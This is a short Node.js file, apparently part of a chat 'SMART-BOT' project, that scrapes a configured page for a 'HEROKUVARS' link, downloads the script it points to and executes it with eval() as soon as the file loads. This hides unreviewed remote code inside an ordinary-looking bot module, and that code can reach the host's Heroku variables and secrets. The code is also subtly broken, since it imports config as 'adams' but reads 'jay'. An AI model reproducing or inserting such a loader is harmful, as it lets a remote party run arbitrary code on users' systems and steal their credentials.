// [SMART-BOT EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Sir Jay 0001                                    
//  >> Version: 8.3.5-smartbot.7

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require(__dirname + "/../config");

async function fetchHEROKUVARSUrl() {
  try {
    const response = await axios.get(jay.SMART_BOT);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("HEROKUVARS")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('HEROKUVARS not found 😭');
    }

    console.log('HEROKUVARS loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchHEROKUVARSUrl();
    
